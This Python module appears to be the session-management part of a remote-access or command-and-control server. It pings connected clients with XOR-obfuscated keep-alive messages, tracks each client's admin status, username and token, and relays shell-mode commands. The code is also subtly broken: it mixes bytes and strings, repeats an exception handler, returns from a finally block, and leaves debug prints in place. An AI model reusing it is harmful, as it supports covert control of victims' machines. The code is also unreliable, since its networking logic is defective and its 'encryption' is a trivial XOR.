import time
import threading
import socket
from prettytable import PrettyTable


from .handler import Handler
from .sql import Sql
from .other import printColor
from .other import XOREncryption
from .other import NB_SESSION , NB_SOCKET , NB_IP , NB_PORT , NB_ALIVE , NB_ADMIN , NB_PATH , NB_USERNAME , NB_TOKEN,NB_SELECT ,SOCK_TIMEOUT


class Management(threading.Thread):
    is_life = "is_life?" 
    """
    Send is life. (ping)
    If the customer responds when he wants.
    if the client does not respond then an exception is declared and management puts inactive status (dead) via CheckConn
    """
    def __init__(self,timeout,ObjSql):
        threading.Thread.__init__(self)
        self.timeout = timeout #How long for each check connexion.
        self.ObjSql = ObjSql
 
 
    def run(self):
        
        while(True):
            
            time.sleep(self.timeout)
            for key in Handler.dict_conn.keys():
                       
                if(Handler.dict_conn[key][NB_ALIVE] ==True and Handler.dict_conn[key][NB_SOCKET] ==False):
                    print("\n\n\nChange value Is he alive true to false.")
                    Handler.dict_conn[key][NB_ALIVE] = False

                #print("TEST SOCK--->",bool(Handler.dict_conn[key][NB_SOCKET]))
                
                if(Handler.dict_conn[key][NB_ALIVE] and bool(Handler.dict_conn[key][NB_SOCKET]) and not Handler.dict_conn[key][NB_SELECT]): #If the connection is alive (True) and the socket object is active (True)

                    try:
                        Handler.dict_conn[key][NB_SOCKET].send(XOREncryption(Management.is_life, Handler.PBKDF2_Key).encode())
                        #print(Handler.dict_conn[key][8])

                    except ConnectionError as connerr: #If the connection does not answer
                        if(Handler.status_connection_display):
                            printColor("information","\n[-] The client's connection is disconnected.")
                            printColor("error",str(connerr))
                        else:
                            pass
                        CheckConn().connexionIsDead(key) #Change status to dead (False)

                else:#If the connection is dead
                    #print(key, "connexion is dead no send msg")
                    pass 

class CheckConn:
    #his class allows you to send and receive data on the network in complete security.
    
    def connexionIsDead(self, nb_session):
        #print(Handler.dict_conn[nb_session][3])
        Handler.dict_conn[nb_session][NB_ALIVE] = False
        Handler.dict_conn[nb_session][NB_SOCKET] = False
        Handler.dict_conn[nb_session][NB_PORT] = "---"

        Handler.dict_conn[nb_session][NB_SELECT] = False #test

        #self.NewObjSql.updateValue("is_he_alive","False",nb_session,True) #Faut-il changer les valeurs de la db en temps reel ? Ou changer les valeurs lors de l'inialisation du script ?
        #self.NewObjSql.closeConn()
        

    def sendsafe(self, nb_session, sock, payload):
        '''
        Checks if the socket sending is not lost.
        Example: If the server sending MOD_SHELL is that at the moment the connection is cut then this function is really useful.
        If the server does not manage to contact the client then the connection is dead function is called.
        
        Returns true if the socket was sent if not retrun false if there was a problem.
        '''
        try:
            sock.send(XOREncryption(payload, Handler.PBKDF2_Key).encode())
        except ConnectionError as connerr: #If the connection does not answer
            if(Handler.status_connection_display):
                printColor("error","[-] The connection to the client was cut {}:{}.\n".format(Handler.dict_conn[nb_session][NB_IP],Handler.dict_conn[nb_session][NB_PORT]))
            self.connexionIsDead(nb_session)
            return False
        
        return True


    def recvall(self,sock,buffer):
    #Receives multiple data with timeout
        result =b""
        sock.settimeout(SOCK_TIMEOUT)
        
        while True:
            try:            
                data_tmp = sock.recv(buffer).decode("utf8","ignore")
                data = XOREncryption(data_tmp, Handler.PBKDF2_Key)
            except socket.timeout:
                result = b"ERRROR"
                break
            except ConnectionError as connerr:
                printColor("error", "[-] Error in recvall: {}".format(connerr))
                result = "ERROR" #safe ?
                break
            else:
                if(data =="\r\n"):
                    break
                else:
                    result+=data
                
        sock.settimeout(None)
        return result
    
    def recvsafe(self,sock,buffer): #Receives a single secure data (no need for "\r\n") to finish the connection 
        
        result = ""
        sock.settimeout(SOCK_TIMEOUT)
        try:            
            data_tmp = sock.recv(buffer).decode("utf8","ignore")
            result = XOREncryption(data_tmp, Handler.PBKDF2_Key)        
        
        except socket.timeout:
            printColor("error", "[-] timeout in recvsafe.")
            result = "ERROR"
        
        except socket.timeout:
            printColor("error","[-] The timeout was exceeded. \n")
        
        except ConnectionError as connerr:
            printColor("error", "[-] error in recvsafe: {}".format(connerr))
            result = "ERROR"
        
        finally:
            sock.settimeout(None)
            return result #empty return
        
    
    def recvcommand(self, sock, buffer):#The decryption of xor is automatic on this method. Does not send data displays the data in real time.
        #Gets the data without delay (session "-c 'command' ")
        sock.settimeout(20)
        cmpt = 0
        data = ""
        size = 0
        
        end_XOR = XOREncryption("\r\n",Handler.PBKDF2_Key) 
        print("END: ",end_XOR,"<----")

        while True:
            try:
                
                data_tmp = sock.recv(buffer).decode("utf8","ignore")
                data += data_tmp

                print(XOREncryption(data_tmp,Handler.PBKDF2_Key))

                size += len(data)
                print("I: " + str(cmpt) + "\n")
                print("Len: " + str(len(data_tmp)))
                print("Size: ", size)

                print("----------------------------------------------------\n")
                
                cmpt +=1 
                
    
            except socket.timeout:
                printColor("error","[-] The timeout was exceeded. \n")
                time.sleep(1)
                break
            except ConnectionError as connerr:
                printColor("error", "[-] error in recvsafe: {}".format(connerr))
                time.sleep(1)
                break
            else:
                if(data_tmp == end_XOR):
                    print("end")
                    break
                
                else:
                    pass


        '''
        print("avant: ",len(data))
        tmp = XOREncryption(data,Handler.PBKDF2_Key)
        print(tmp)
        print(len(tmp))
        #-----
        #test@:
        print("test2: \n\n")
        test2 = XOREncryption(data[0:4096],Handler.PBKDF2_Key)
        print(test2)

        print("test3: \n\n")
        test3 = test2 = XOREncryption(data[-4096],Handler.PBKDF2_Key)
        print(test3)
        sock.settimeout(None)
        '''

        print("test1:\n\n")
        result = ""
        for char in data:
            print(XOREncryption(char,Handler.PBKDF2_Key))
            result += XOREncryption(char,Handler.PBKDF2_Key)
        
        print(result)